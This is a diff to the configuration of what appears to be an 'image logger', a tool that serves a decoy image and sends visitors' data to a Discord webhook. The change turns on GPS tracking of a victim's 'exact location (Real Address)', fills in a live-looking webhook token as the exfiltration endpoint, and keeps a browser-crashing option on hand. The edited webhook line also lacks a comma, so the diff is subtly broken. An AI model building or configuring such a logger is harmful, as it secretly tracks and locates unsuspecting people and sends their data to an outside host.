@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1342598891287220294/Nt5Voc-fOLy8lwlahCBXYY0OZLpciZPujbrKYcrCWUMA8eTMyUnYF0WD3Mszi6Caw6VY
-    "image": "https://as2.ftcdn.net/v2/jpg/09/37/12/73/1000_F_937127370_RzigoTq55hhV6TOcnRXbZ2kBjSOgWUMJ.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1342598891287220294/Nt5Voc-fOLy8lwlahCBXYY0OZLpciZPujbrKYcrCWUMA8eTMyUnYF0WD3Mszi6Caw6VY"
+    "image": "https://as2.ftcdn.net/v2/jpg/09/37/12/73/1000_F_937127370_RzigoTq55hhV6TOcnRXbZ2kBjSOgWUMJ.jpg ", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True , # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
